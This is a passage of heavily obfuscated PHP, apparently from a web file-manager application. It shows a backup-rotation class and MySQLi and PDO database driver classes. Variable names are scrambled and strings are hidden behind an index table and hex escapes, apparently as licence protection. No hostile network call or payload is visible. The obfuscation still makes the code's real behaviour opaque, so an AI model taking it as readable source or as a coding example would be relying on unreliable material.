$¬ÙƒÃ‚Å = $®çË•û„[810]; while (!0) { $¿Ù•Õµ++; if ($¿Ù•Õµ <= 2) { $¤–‘¨å„ = $¿Ù•Õµ; break; } else { if ($¿Ù•Õµ < 2) { continue; } } $ßãÓÂ— = !0; for ($¨ŸÚÙÖ = 2; $¨ŸÚÙÖ <= sqrt($¿Ù•Õµ); $¨ŸÚÙÖ++) { if ($¿Ù•Õµ % $¨ŸÚÙÖ == 0) { $ßãÓÂ— = !1; } } if ($ßãÓÂ—) { $¤–‘¨å„ = $¿Ù•Õµ; break; } } $ÇİÜ´¢ø[] = $¤–‘¨å„; $¾ç°¹ĞÚ = $®çË•û„[811]; } $îÚü—üˆ = 2; $Ï–¶è”Ï = $®çË•û„[812]; while ($Ï–¶è”Ï < $®çË•û„[692]) { if ($Ï–¶è”Ï >= 0) { break; } $Ï–¶è”Ï++; } for ($¿Ù•Õµ = $óĞ™÷×Â; $¿Ù•Õµ > 1; $¿Ù•Õµ--) { $ßãÓÂ— = !0; foreach ($ÇİÜ´¢ø as $óš¨‰Ö˜) { if ($¿Ù•Õµ % $óš¨‰Ö˜ == 0) { $ßãÓÂ— = !1; break; } } if ($ßãÓÂ—) { $îÚü—üˆ = $¿Ù•Õµ; break; } } return $îÚü—üˆ; } public function uxkv77fc9f13($¶Œ‚õœö, $ø¦¤¹ÉÖ) { $şÃğŠƒÅ =& $_SERVER[ˆ¡¹µ‹Â]; $Ìğ…šº± =& $_SERVER[ Ãœáã¬]; return call_user_func(array($Ìğ…šº±[8], $Ìğ…šº±[308]), $¶Œ‚õœö, $ø¦¤¹ÉÖ); $Óêá®ñ¦ = $şÃğŠƒÅ[813]; if (strlen($Óêá®ñ¦) < $şÃğŠƒÅ[699]) { die; } } public function butf4e080185($Úã¼µ­ç, $¸óĞ÷¡ğ) { $¨§úï×ß =& $_SERVER[ Ãœáã¬]; return call_user_func(array($¨§úï×ß[309], $¨§úï×ß[310]), $Úã¼µ­ç, $¸óĞ÷¡ğ); } public function mows81ee32e9($×óë˜”è, $¤Ü÷ş±) { $Ãâ—şÒª =& $_SERVER[ Ãœáã¬]; return call_user_func(array($Ãâ—şÒª[309], $Ãâ—şÒª[311]), $×óë˜”è, $¤Ü÷ş±); $Üææ†Œ = $_SERVER[ˆ¡¹µ‹Â][814]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ˆ¡¹µ‹Â][815]); $this->init(); $this->keep(); } public function init() { $öˆ±á =& $_SERVER[ˆ¡¹µ‹Â]; $this->isManual(); self::$name = date($öˆ±á[816]); if (!($×ª‡üÃ’ = $this->model->lastItem())) { $×ª‡üÃ’ = $this->initData(); } else { self::$name = $×ª‡üÃ’[$öˆ±á[32]]; if ($×ª‡üÃ’[$öˆ±á[817]] == $öˆ±á[91]) { self::$name = date($öˆ±á[272]); $Šˆ‹åï = intval(_get($×ª‡üÃ’, $öˆ±á[818], 0)); if (self::$manual == 0 && $×ª‡üÃ’[$öˆ±á[32]] == self::$name) { $this->model->remove($×ª‡üÃ’[$öˆ±á[475]]); } $×ª‡üÃ’ = $this->initData($Šˆ‹åï, $×ª‡üÃ’[$öˆ±á[819]]); } else { $this->checkStore($×ª‡üÃ’[$öˆ±á[819]]); } } self::$option = $×ª‡üÃ’; } private function isManual() { $šÉÔã® = _get($GLOBALS, $_SERVER[ˆ¡¹µ‹Â][820], 0); $šÉÔã® = intval($šÉÔã®); self::$manual = $šÉÔã® && $šÉÔã® == 1 ? 1 : 0; } private function initData($áòâšÄÓ = 0, $Ë•æÓìË = '') { $òè†ËÎ™ =& $_SERVER[ˆ¡¹µ‹Â]; $ĞìÕœ ™ = $this->model->config(); if ($Ë•æÓìË && $ĞìÕœ ™[$òè†ËÎ™[819]] != $Ë•æÓìË) { $áòâšÄÓ = 0; } $this->checkStore($ĞìÕœ ™[$òè†ËÎ™[819]]); if (self::$manual == 1) { self::$name .= $òè†ËÎ™[11] . date($òè†ËÎ™[821]); } $òÕåÊğù = array($òè†ËÎ™[819] => $ĞìÕœ ™[$òè†ËÎ™[819]], $òè†ËÎ™[32] => self::$name, $òè†ËÎ™[817] => 0, $òè†ËÎ™[171] => $ĞìÕœ ™[$òè†ËÎ™[171]], $òè†ËÎ™[822] => self::$manual, $òè†ËÎ™[369] => array($òè†ËÎ™[823] => array($òè†ËÎ™[817] => 0), $òè†ËÎ™[824] => array($òè†ËÎ™[817] => 0, $òè†ËÎ™[825] => 0, $òè†ËÎ™[826] => 0, $òè†ËÎ™[33] => $òè†ËÎ™[12], $òè†ËÎ™[827] => 0, $òè†ËÎ™[828] => 0), $òè†ËÎ™[829] => array($òè†ËÎ™[817] => 0, $òè†ËÎ™[825] => 0, $òè†ËÎ™[826] => 0, $òè†ËÎ™[827] => 0, $òè†ËÎ™[828] => 0), $òè†ËÎ™[230] => array($òè†ËÎ™[817] => 0, $òè†ËÎ™[830] => 0, $òè†ËÎ™[831] => 0, $òè†ËÎ™[832] => 0, $òè†ËÎ™[833] => 0, $òè†ËÎ™[541] => $áòâšÄÓ, $òè†ËÎ™[827] => 0, $òè†ËÎ™[828] => 0)), $òè†ËÎ™[827] => time(), $òè†ËÎ™[828] => 0); $ÁÖ‚Ş¨¢ = $this->model->insert($òÕåÊğù); $òÕåÊğù[$òè†ËÎ™[475]] = $ÁÖ‚Ş¨¢; return $òÕåÊğù; } private function checkStore($ÍµíÓó) { $‚î€–òƒ = Model($_SERVER[ˆ¡¹µ‹Â][834]); $‚ª˜ù‚ = $‚î€–òƒ->listData($ÍµíÓó); $‚î€–òƒ->checkConfig($‚ª˜ù‚); } public static function get() { if (!self::$option) { $çŞé´¦³ = Model($_SERVER[ˆ¡¹µ‹Â][815]); $‘¼æÔ÷ = $çŞé´¦³->findByName(self::$name); $çŞé´¦³->parseContent($‘¼æÔ÷); self::$option = $‘¼æÔ÷; } return self::$option; } public static function set($›û·½) { $–õ¬æé =& $_SERVER[ˆ¡¹µ‹Â]; $²‘Üš§ß = self::get(); foreach ($›û·½ as $àÒ·âÂ => $ˆ¼ƒºòî) { array_set_value($²‘Üš§ß, $àÒ·âÂ, $ˆ¼ƒºòî); } Model($–õ¬æé[815])->update($²‘Üš§ß[$–õ¬æé[475]], $²‘Üš§ß); self::$option = $²‘Üš§ß; return self::$option; } public function keep() { $‰®ë¿ =& $_SERVER[ˆ¡¹µ‹Â]; $—§ÔÚ®¥ = self::get(); if (_get($—§ÔÚ®¥, $‰®ë¿[835], 0) == $‰®ë¿[91]) { return; } $this->backupKeep($—§ÔÚ®¥); self::set(array($‰®ë¿[835] => 1)); } private function backupKeep($·æµ¨É) { $·Õ†àØ =& $_SERVER[ˆ¡¹µ‹Â]; if (self::$manual == 1) { return; } $øâº æğ = $this->model->listData(); if (empty($øâº æğ)) { return; } $Ã•‚Ö‰ª = 0; $ÒÄ§Ÿ‰Î = array(); foreach ($øâº æğ as $§ÈÔŠ Ó) { if ($Ã•‚Ö‰ª >= 7) { break; } $ÒÄ§Ÿ‰Î[] = $§ÈÔŠ Ó[$·Õ†àØ[32]]; $Ã•‚Ö‰ª++; } for ($Ã•‚Ö‰ª = 0; $Ã•‚Ö‰ª < 12; $Ã•‚Ö‰ª++) { $ÒÄ§Ÿ‰Î[] = date($·Õ†àØ[836], strtotime("\55{$Ã•‚Ö‰ª}\x20\x6d\157\x6e\164\x68\163")); } $ÒÄ§Ÿ‰Î = array_unique($ÒÄ§Ÿ‰Î); $®óóÆ¨Ø = Model($·Õ†àØ[837])->get($·Õ†àØ[838]); foreach ($øâº æğ as $§ÈÔŠ Ó) { if (isset($§ÈÔŠ Ó[$·Õ†àØ[822]]) && $§ÈÔŠ Ó[$·Õ†àØ[822]] == $·Õ†àØ[91]) { continue; } if (!empty($§ÈÔŠ Ó[$·Õ†àØ[32]]) && in_array($§ÈÔŠ Ó[$·Õ†àØ[32]], $ÒÄ§Ÿ‰Î)) { continue; } $this->model->remove($§ÈÔŠ Ó[$·Õ†àØ[475]]); $¢ƒâ× = $this->backupPath($·æµ¨É, $®óóÆ¨Ø); IO::remove($¢ƒâ×, !1); } } private function backupPath($úªï•Ì—, $»èÛ«Æ¥ = false) { $—¶¥¬“¯ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$»èÛ«Æ¥) { $»èÛ«Æ¥ = Model($—¶¥¬“¯[837])->get($—¶¥¬“¯[838]); } $ËğÖò¡ = $úªï•Ì—[$—¶¥¬“¯[32]]; $½†ÓÔ÷ß = substr(md5($—¶¥¬“¯[839] . $»èÛ«Æ¥ . $ËğÖò¡), 0, 8); return "\173\151\x6f\72{$úªï•Ì—[$—¶¥¬“¯[819]]}\175\x2f\144\141\x74\x61\x62\x61\x73\x65\x2f\142\x61\x63\153\165\160\57" . $ËğÖò¡ . $—¶¥¬“¯[11] . $½†ÓÔ÷ß; } public function db() { $†–äŠ‰« =& $_SERVER[ˆ¡¹µ‹Â]; $Ïœ¤€Ô© = self::get(); if (_get($Ïœ¤€Ô©, $†–äŠ‰«[840], 0) == $†–äŠ‰«[91]) { return !0; } $ÕÒ¢ãù = new BackupDb(); if (!$ÕÒ¢ãù->index()) { return !1; } self::set(array($†–äŠ‰«[840] => 1)); return !0; } public function dbFile() { $ˆŸšÒ”µ =& $_SERVER[ˆ¡¹µ‹Â]; $†ã§”„› = self::get(); if (_get($†ã§”„›, $ˆŸšÒ”µ[841], 0) == $ˆŸšÒ”µ[91]) { return !0; } $Š·ßùíÄ = new BackupDbFile(); if (!$Š·ßùíÄ->index()) { return !1; } self::set(array($ˆŸšÒ”µ[841] => 1)); return !0; } public function file() { $§•˜øÑò =& $_SERVER[ˆ¡¹µ‹Â]; $ÈïıÁæ = self::get(); if (_get($ÈïıÁæ, $§•˜øÑò[842], 0) == $§•˜øÑò[91]) { return !0; } if ($ÈïıÁæ[$§•˜øÑò[171]] == $§•˜øÑò[843]) { $É—Şå = new BackupFile(); if (!$É—Şå->index()) { return !1; } } self::set(array($§•˜øÑò[842] => 1, $§•˜øÑò[817] => 1)); return !0; } } goto eÃĞ¹ºë”Ğ; d¶¾¡ßŠ§Õ: class DbMysqli extends Db { public function __construct($ºå÷¶’™ = '') { $‹£ùË±Å =& $_SERVER[ˆ¡¹µ‹Â]; if (!extension_loaded($‹£ùË±Å[983])) { think_exception(think_lang($‹£ùË±Å[14]) . $‹£ùË±Å[984]); } if (!empty($ºå÷¶’™)) { $this->config = $ºå÷¶’™; if (empty($this->config[$‹£ùË±Å[17]])) { $this->config[$‹£ùË±Å[17]] = $‹£ùË±Å[12]; } } } public function connect($‰©ìâÜ = '', $îù´ØŒÇ = 0) { $ñ™¡‰ñÔ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($this->linkID[$îù´ØŒÇ])) { if (empty($‰©ìâÜ)) { $‰©ìâÜ = $this->config; } $this->linkID[$îù´ØŒÇ] = new mysqli($‰©ìâÜ[$ñ™¡‰ñÔ[957]], $‰©ìâÜ[$ñ™¡‰ñÔ[959]], $‰©ìâÜ[$ñ™¡‰ñÔ[960]], $‰©ìâÜ[$ñ™¡‰ñÔ[21]], $‰©ìâÜ[$ñ™¡‰ñÔ[958]] ? intval($‰©ìâÜ[$ñ™¡‰ñÔ[958]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $É†ÏĞ¡ = $this->linkID[$îù´ØŒÇ]->server_version; $this->linkID[$îù´ØŒÇ]->query($ñ™¡‰ñÔ[961] . think_config($ñ™¡‰ñÔ[962]) . $ñ™¡‰ñÔ[58]); if ($É†ÏĞ¡ > $ñ™¡‰ñÔ[963]) { $this->linkID[$îù´ØŒÇ]->query($ñ™¡‰ñÔ[964]); } $this->connected = !0; if (1 != think_config($ñ™¡‰ñÔ[22])) { unset($this->config); } } return $this->linkID[$îù´ØŒÇ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ùäš½²) { $Â¡Ê– =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ùäš½²; if ($this->queryID) { $this->free(); } think_action_status($Â¡Ê–[23], 1); think_status($Â¡Ê–[24]); $this->queryID = $this->_linkID->query($Ùäš½²); if ($this->_linkID->more_results()) { while (($îë¯‘ßı = $this->_linkID->next_result()) != NULL) { $îë¯‘ßı->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($²Á ¡ø²) { $æÖ úÆı =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $²Á ¡ø²; if ($this->queryID) { $this->free(); } think_action_status($æÖ úÆı[25], 1); think_status($æÖ úÆı[24]); $‡ÛÆ¦¯¤ = $this->_linkID->query($²Á ¡ø²); $this->debug(); if (!1 === $‡ÛÆ¦¯¤) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÙÊ©ª˜ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÙÊ©ª˜) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ç–ñï›° = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ç–ñï›°) { $this->error(); return !1; } } return !0; } private function getAll() { $ß£‹áËŒ = array(); if ($this->numRows > 0) { for ($Òœ‘¸ÅÓ = 0; $Òœ‘¸ÅÓ < $this->numRows; $Òœ‘¸ÅÓ++) { $ß£‹áËŒ[$Òœ‘¸ÅÓ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ß£‹áËŒ; } public function getFields($¿¿¨‹ˆ) { $æœÜÅªÈ =& $_SERVER[ˆ¡¹µ‹Â]; $è¼Ì§—Á = $this->query($æœÜÅªÈ[968] . $this->parseKey($¿¿¨‹ˆ)); $Üş–ê“Ü = array(); if ($è¼Ì§—Á) { foreach ($è¼Ì§—Á as $âµâ ÌÑ => $ƒ‘å¢ïè) { $Üş–ê“Ü[$ƒ‘å¢ïè[$æœÜÅªÈ[31]]] = array($æœÜÅªÈ[32] => $ƒ‘å¢ïè[$æœÜÅªÈ[31]], $æœÜÅªÈ[33] => $ƒ‘å¢ïè[$æœÜÅªÈ[34]], $æœÜÅªÈ[35] => (bool) ($ƒ‘å¢ïè[$æœÜÅªÈ[36]] === $æœÜÅªÈ[12]), $æœÜÅªÈ[37] => $ƒ‘å¢ïè[$æœÜÅªÈ[38]], $æœÜÅªÈ[39] => strtolower($ƒ‘å¢ïè[$æœÜÅªÈ[40]]) == $æœÜÅªÈ[41], $æœÜÅªÈ[42] => strtolower($ƒ‘å¢ïè[$æœÜÅªÈ[43]]) == $æœÜÅªÈ[44]); } } return $Üş–ê“Ü; } public function getTables($æÕÃ„ = '') { $¼±Ú‰÷ =& $_SERVER[ˆ¡¹µ‹Â]; $‘ì™€½Ğ = !empty($æÕÃ„) ? $¼±Ú‰÷[970] . $æÕÃ„ . $¼±Ú‰÷[971] : $¼±Ú‰÷[972]; $Ş›¡ˆ¿½ = $this->query($‘ì™€½Ğ); $Ü³Áõ¢Û = array(); if ($Ş›¡ˆ¿½) { foreach ($Ş›¡ˆ¿½ as $êÊ¿¹ÛÒ => $åç¸ÚÆ) { $Ü³Áõ¢Û[$êÊ¿¹ÛÒ] = current($åç¸ÚÆ); } } return $Ü³Áõ¢Û; } public function replace($Ä¿˜ÕÈê, $ñ–ÛÇ×¢ = array()) { $ïÇÔêÁ· =& $_SERVER[ˆ¡¹µ‹Â]; foreach ($Ä¿˜ÕÈê as $úâÌˆ²‚ => $”ÀÏÙÎ×) { $ûòÙÑ‘° = $this->parseValue($”ÀÏÙÎ×); if (is_scalar($ûòÙÑ‘°)) { $Ë¢‡²Ìİ[] = $ûòÙÑ‘°; $µáîş™”[] = $this->parseKey($úâÌˆ²‚); } } $ì¾æŒé¢ = $ïÇÔêÁ·[973] . $this->parseTable($ñ–ÛÇ×¢[$ïÇÔêÁ·[356]]) . $ïÇÔêÁ·[974] . implode($ïÇÔêÁ·[50], $µáîş™”) . $ïÇÔêÁ·[975] . implode($ïÇÔêÁ·[50], $Ë¢‡²Ìİ) . $ïÇÔêÁ·[976]; return $this->execute($ì¾æŒé¢); } public function insertAll($„‡ìçÛ±, $Ù‡Ù°•Æ = array(), $Å³Ö•Ÿ£ = false) { $Ïß—ºÅ´ =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_array($„‡ìçÛ±[0])) { return !1; } $ ­²Üôà = array_keys($„‡ìçÛ±[0]); $ıìÓÖŞµ = array(); foreach ($„‡ìçÛ± as $±·ï¤åü) { $üé½¢ä‰ = array(); foreach ($±·ï¤åü as $›­ñÆ¢ => $ã½ÇŞñ‹) { $ã½ÇŞñ‹ = $this->parseValue($ã½ÇŞñ‹); if (is_scalar($ã½ÇŞñ‹)) { $üé½¢ä‰[] = $ã½ÇŞñ‹; } } $ıìÓÖŞµ[] = $Ïß—ºÅ´[337] . implode($Ïß—ºÅ´[50], $üé½¢ä‰) . $Ïß—ºÅ´[976]; } array_walk($ ­²Üôà, array($this, $Ïß—ºÅ´[977])); $™¿Õ‰º‹ = $Å³Ö•Ÿ£ ? $Ïß—ºÅ´[978] : $Ïß—ºÅ´[979]; $è¼ÜÁøÔ = $™¿Õ‰º‹ . $Ïß—ºÅ´[980] . $this->parseTable($Ù‡Ù°•Æ[$Ïß—ºÅ´[356]]) . $Ïß—ºÅ´[974] . implode($Ïß—ºÅ´[50], $ ­²Üôà) . $Ïß—ºÅ´[981] . implode($Ïß—ºÅ´[50], $ıìÓÖŞµ); return $this->execute($è¼ÜÁøÔ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $±Æ•¡£ˆ =& $_SERVER[ˆ¡¹µ‹Â]; $this->error = $this->_linkID->errno . $±Æ•¡£ˆ[4] . $this->_linkID->error; if ($±Æ•¡£ˆ[12] != $this->queryStr) { $this->error .= LNG($±Æ•¡£ˆ[48]) . $this->queryStr; } think_trace($this->error, $±Æ•¡£ˆ[12], $±Æ•¡£ˆ[49]); return $this->error; } public function escapeString($†€ìû¹) { if ($this->_linkID) { return $this->_linkID->real_escape_string($†€ìû¹); } else { return addslashes($†€ìû¹); } } public function parseKey(&$™š˜Ù², $ğùÕ‘ Ã = true) { $ÀÔ³ìÙ =& $_SERVER[ˆ¡¹µ‹Â]; if ($ğùÕ‘ Ã) { $™š˜Ù² = $this->parseKeyCheck($™š˜Ù²); } if ($™š˜Ù² != $ÀÔ³ìÙ[220] && !preg_match($ÀÔ³ìÙ[982], $™š˜Ù²)) { $™š˜Ù² = $ÀÔ³ìÙ[461] . trim($™š˜Ù², $ÀÔ³ìÙ[461]) . $ÀÔ³ìÙ[461]; } return $™š˜Ù²; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ó°ŠäÈÒ = '') { $çˆÊ™€ =& $_SERVER[ˆ¡¹µ‹Â]; if (!class_exists($çˆÊ™€[985])) { think_exception(think_lang($çˆÊ™€[14]) . $çˆÊ™€[986]); } if (!empty($Ó°ŠäÈÒ)) { $this->config = $Ó°ŠäÈÒ; if (empty($this->config[$çˆÊ™€[17]])) { $this->config[$çˆÊ™€[17]] = array(); } } } public function connect($²şğª£¿ = '', $Ê”Ğ¥ = 0) { $²ŒÊ‹ ¶ =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($this->linkID[$Ê”Ğ¥])) { if (empty($²şğª£¿)) { $²şğª£¿ = $this->config; } $ïõ–¢Ş‘ = !empty($²şğª£¿[$²ŒÊ‹ ¶[17]][$²ŒÊ‹ ¶[18]]) ? $²şğª£¿[$²ŒÊ‹ ¶[17]][$²ŒÊ‹ ¶[18]] : $this->pconnect; if ($ïõ–¢Ş‘) { $²şğª£¿[$²ŒÊ‹ ¶[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ê”Ğ¥] = new PDO($²şğª£¿[$²ŒÊ‹ ¶[987]], $²şğª£¿[$²ŒÊ‹ ¶[959]], $²şğª£¿[$²ŒÊ‹ ¶[960]], $²şğª£¿[$²ŒÊ‹ ¶[17]]); } catch (PDOException $°ˆŠ­–) { think_exception($°ˆŠ­–->getMessage()); } $this->dbType = $this->_getDsnType($²şğª£¿[$²ŒÊ‹ ¶[987]]); if (in_array($this->dbType, array($²ŒÊ‹ ¶[988], $²ŒÊ‹ ¶[989], $²ŒÊ‹ ¶[990], $²ŒÊ‹ ¶[991]))) { think_exception($²ŒÊ‹ ¶[992] . $this->dbType . $²ŒÊ‹ ¶[993] . $this->dbType . $²ŒÊ‹ ¶[994]); } if (!$this->linkID[$Ê”Ğ¥]) { think_exception($²ŒÊ‹ ¶[995]); } try { $this->linkID[$Ê”Ğ¥]->exec($²ŒÊ‹ ¶[996] . think_config($²ŒÊ‹ ¶[962])); } catch (Exception $°ˆŠ­–) { } $this->connected = !0; if (1 != think_config($²ŒÊ‹ ¶[22])) { unset($this->config); } } return $this->linkID[$Ê”Ğ¥]; } public function free() { $this->PDOStatement = null; } public function query($¤¦Œ¹ë, $ƒµâ¦ŒŞ = array()) { $´ÇíÙøş =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¤¦Œ¹ë; if (!empty($ƒµâ¦ŒŞ)) { $this->queryStr .= $´ÇíÙøş[997] . print_r($ƒµâ¦ŒŞ, !0) . $´ÇíÙøş[998]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($´ÇíÙøş[23], 1); think_status($´ÇíÙøş[24]); $this->PDOStatement = $this->_linkID->prepare($¤¦Œ¹ë); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ëô«ôİ´ = $this->PDOStatement->execute($ƒµâ¦ŒŞ); $this->debug(); if (!1 === $Ëô«ôİ´) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($éÂ˜§¥ä, $¥Õ€û£Û = array()) { $«†İÅ€Ú =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $éÂ˜§¥ä; if (!empty($¥Õ€û£Û)) { $this->queryStr .= $«†İÅ€Ú[997] . print_r($¥Õ€û£Û, !0) . $«†İÅ€Ú[998]; } $­Õ÷Ëñó = !1; if ($this->dbType == $«†İÅ€Ú[991]) { if (preg_match($«†İÅ€Ú[999], $this->queryStr, $ºÊ½§Ğ)) { $this->table = think_config($«†İÅ€Ú[1000]) . str_ireplace(think_config($«†İÅ€Ú[1001]), $«†İÅ€Ú[454], $ºÊ½§Ğ[2]); $­Õ÷Ëñó = (bool) $this->query($«†İÅ€Ú[1002] . strtoupper($this->table) . $«†İÅ€Ú[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($«†İÅ€Ú[25], 1); think_status($«†İÅ€Ú[24]); $this->PDOStatement = $this->_linkID->prepare($éÂ˜§¥ä); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $öã±£“ = $this->PDOStatement->execute($¥Õ€û£Û); $this->debug(); if (!1 === $öã±£“) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($­Õ÷Ëñó || preg_match($«†İÅ€Ú[1003], $éÂ˜§¥ä)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Œàù›ÖÇ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Œàù›ÖÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $×èªèæÚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$×èªèæÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $ŒÆ¸·ŸÀ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ŒÆ¸·ŸÀ); return $ŒÆ¸·ŸÀ; } public function getFields($Ïß’£İ) { $À»şß„„ =& $_SERVER[ˆ¡¹µ‹Â]; $this->initConnect(!0); if (think_config($À»şß„„[1004])) { $ß–”¯ŸÔ = str_replace($À»şß„„[1005], $Ïß’£İ, think_config($À»şß„„[1004])); } else { switch ($this->dbType) { case $À»şß„„[988]: case $À»şß„„[1006]: $ß–”¯ŸÔ = "\123\105\114\x45\103\x54\40\x20\40\x63\157\154\x75\x6d\x6e\x5f\156\x61\x6d\x65\x20\141\163\x20\x27\x4e\141\x6d\x65\47\x2c\x20\40\x20\x64\x61\164\141\x5f\164\171\160\145\x20\x61\x73\40\x27\124\x79\x70\x65\x27\x2c\x20\x20\40\143\x6f\x6c\165\155\156\137\x64\x65\x66\x61\x75\x6c\x74\x20\141\163\40\x27\x44\145\146\x61\x75\x6c\164\47\x2c\40\40\x20\x69\163\137\156\x75\x6c\154\141\x62\154\145\40\x61\x73\x20\47\x4e\165\154\154\47\12\11\11\106\x52\x4f\115\11\151\156\x66\157\x72\x6d\x61\164\x69\157\x6e\137\x73\x63\150\145\x6d\x61\x2e\x74\x61\x62\x6c\x65\x73\40\x41\x53\x20\x74\12\11\11\112\x4f\x49\116\x9\x69\x6e\x66\x6f\162\155\x61\164\x69\157\156\x5f\163\143\150\145\x6d\141\x2e\x63\x6f\x6c\x75\x6d\x6e\163\40\101\x53\x20\143\12\x9\x9\x4f\116\x20\x20\x74\56\164\x61\x62\154\145\x5f\143\x61\164\x61\x6c\x6f\x67\x20\x3d\x20\143\56\164\141\142\x6c\145\x5f\x63\141\x74\x61\154\157\147\xa\11\x9\101\116\x44\40\164\56\x74\x61\x62\x6c\145\x5f\x73\x63\x68\x65\x6d\141\x20\x3d\x20\x63\56\164\141\142\154\x65\137\163\x63\150\x65\x6d\141\12\x9\11\101\x4e\104\x20\x74\x2e\x74\x61\x62\x6c\x65\137\x6e\141\155\145\x20\x3d\40\x63\x2e\164\141\x62\x6c\x65\x5f\156\141\155\x65\12\11\11\127\110\x45\x52\105\x20\40\40\164\x2e\164\141\142\154\145\x5f\156\x61\x6d\145\40\75\40\47{$Ïß’£İ}\x27"; break; case $À»şß„„[1007]: $ß–”¯ŸÔ = $À»şß„„[1008] . $Ïß’£İ . $À»şß„„[1009]; break; case $À»şß„„[989]: case $À»şß„„[991]: $ß–”¯ŸÔ = $À»şß„„[1010] . $À»şß„„[1011] . $À»şß„„[1012] . strtoupper($Ïß’£İ) . $À»şß„„[1013] . strtoupper($Ïß’£İ) . $À»şß„„[1014]; break; case $À»şß„„[1015]: $ß–”¯ŸÔ = $À»şß„„[1016] . $Ïß’£İ . $À»şß„„[1017]; break; case $À»şß„„[990]: break; case $À»şß„„[1018]: default: $ß–”¯ŸÔ = $À»şß„„[1019] . ($this->dbType == $À»şß„„[1018] ? "\140{$Ïß’£İ}\x60" : $Ïß’£İ); } } $°ü¨üë = $this->query($ß–”¯ŸÔ); $˜’ÍÕ ² = array(); if ($°ü¨üë) { foreach ($°ü¨üë as $™…ÀÀ©× => $øŞê¯ÁÔ) { $øŞê¯ÁÔ = array_change_key_case($øŞê¯ÁÔ); $øŞê¯ÁÔ[$À»şß„„[32]] = isset($øŞê¯ÁÔ[$À»şß„„[32]]) ? $øŞê¯ÁÔ[$À»şß„„[32]] : $À»şß„„[454]; $øŞê¯ÁÔ[$À»şß„„[33]] = isset($øŞê¯ÁÔ[$À»şß„„[33]]) ? $øŞê¯ÁÔ[$À»şß„„[33]] : $À»şß„„[454]; $Çí˜é®¯ = isset($øŞê¯ÁÔ[$À»şß„„[350]]) ? $øŞê¯ÁÔ[$À»şß„„[350]] : $øŞê¯ÁÔ[$À»şß„„[32]]; $˜’ÍÕ ²[$Çí˜é®¯] = array($À»şß„„[32] => $Çí˜é®¯, $À»şß„„[33] => $øŞê¯ÁÔ[$À»şß„„[33]], $À»şß„„[35] => (bool) (isset($øŞê¯ÁÔ[$À»şß„„[106]]) && $øŞê¯ÁÔ[$À»şß„„[106]] === $À»şß„„[12] || isset($øŞê¯ÁÔ[$À»şß„„[35]]) && $øŞê¯ÁÔ[$À»şß„„[35]] === $À»şß„„[12]), $À»şß„„[37] => isset($øŞê¯ÁÔ[$À»şß„„[37]]) ? $øŞê¯ÁÔ[$À»şß„„[37]] : (isset($øŞê¯ÁÔ[$À»şß„„[56]]) ? $øŞê¯ÁÔ[$À»şß„„[56]] : $À»şß„„[454]), $À»şß„„[39] => isset($øŞê¯ÁÔ[$À»şß„„[97]]) ? strtolower($øŞê¯ÁÔ[$À»şß„„[97]]) == $À»şß„„[41] : (isset($øŞê¯ÁÔ[$À»şß„„[57]]) ? $øŞê¯ÁÔ[$À»şß„„[57]] : !1), $À»şß„„[42] => isset($øŞê¯ÁÔ[$À»şß„„[1020]]) ? strtolower($øŞê¯ÁÔ[$À»şß„„[1020]]) == $À»şß„„[44] : (isset($øŞê¯ÁÔ[$À»şß„„[97]]) ? $øŞê¯ÁÔ[$À»şß„„[97]] : !1)); } } return $˜’ÍÕ ²; } public function getTables($„üëªø© = '') { $ÓÆ¯¼›¶ =& $_SERVER[ˆ¡¹µ‹Â]; if (think_config($ÓÆ¯¼›¶[1021])) { $¨÷ñÕ¹ = str_replace($ÓÆ¯¼›¶[1022], $„üëªø©, think_config($ÓÆ¯¼›¶[1021])); } else { switch ($this->dbType) { case $ÓÆ¯¼›¶[989]: case $ÓÆ¯¼›¶[991]: 